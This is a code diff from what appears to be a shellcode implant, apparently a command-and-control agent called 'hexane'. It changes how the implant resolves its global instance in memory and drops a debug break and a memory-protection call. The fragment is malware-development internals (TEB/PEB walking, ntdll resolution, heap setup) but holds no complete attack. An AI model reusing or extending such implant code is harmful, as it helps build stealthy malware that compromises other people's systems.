@@ -99,19 +99,14 @@ namespace Memory {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
 
             _hexane instance    = { };
-            size_t region_size  = 0;
             void *region        = { };
 
             instance.teb = NtCurrentTeb();
             instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
 
             instance.teb->LastErrorValue    = ERROR_SUCCESS;
-            __debugbreak();
             instance.base.address           = U_PTR(InstStart());
             instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
-
-            region      = C_PTR(instance.base.address + &__global);
-            region_size = sizeof(void*);
 
             if (
                 !(instance.modules.ntdll = M_PTR(NTDLL)) ||
@@ -121,10 +116,7 @@ namespace Memory {
                 return;
             }
 
-            if (!NT_SUCCESS(instance.nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
-                return;
-            }
-            region = C_PTR(GLOBAL_OFFSET);
+            region = C_PTR(instance.base.address + U_PTR(&__global));
             if (!(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                 return;
             }
